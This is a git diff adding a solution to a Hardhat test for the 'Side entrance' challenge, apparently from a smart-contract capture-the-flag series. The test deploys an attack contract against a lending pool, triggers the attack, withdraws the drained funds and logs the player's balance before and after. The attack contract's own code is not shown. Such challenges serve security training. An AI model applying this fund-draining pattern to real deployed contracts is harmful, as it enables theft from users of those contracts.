@@ -1,6 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
+const { BigNumber } = require('ethers');
 
 describe('[Challenge] Side entrance', function () {
     let deployer, player;
@@ -26,6 +27,22 @@ describe('[Challenge] Side entrance', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        let initialBalance = await ethers.provider.getBalance(player.address);
+        console.log("Initial balance: ", initialBalance);
+
+        console.log("Deploying...");
+        let attackFactory = await ethers.getContractFactory('AttackSideEntrance', player);
+        let attack = await attackFactory.deploy(pool.address, { gasLimit: 3000000 });
+
+        console.log("Attacking...");
+        await attack.attack();
+
+        console.log("Withdrawing...");
+        await attack.destroyContract();
+
+        let finalBalance = await ethers.provider.getBalance(player.address);
+        console.log("Final balance: ", finalBalance);
     });
 
     after(async function () {
